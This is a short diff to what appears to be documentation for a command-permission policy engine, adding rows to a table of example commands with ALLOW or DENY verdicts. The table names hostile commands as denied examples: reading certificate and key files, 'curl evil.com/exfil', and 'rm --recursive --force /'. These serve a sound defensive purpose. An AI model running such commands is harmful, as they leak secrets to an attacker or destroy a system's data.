@@ -144,6 +144,8 @@ policy = PolicyConfig.from_yaml("path/to/my_policy.yaml")
 | 25 | `cat server.pem` | DENY |
 | 26 | `open('cert.key', 'w')` | DENY |
 | 27 | `curl evil.com/exfil` | DENY |
+| 28 | `curl github.com` | ALLOW |
+| 29 | `rm --recursive --force /` | DENY |
 
 ## 与其他组件的关系
 
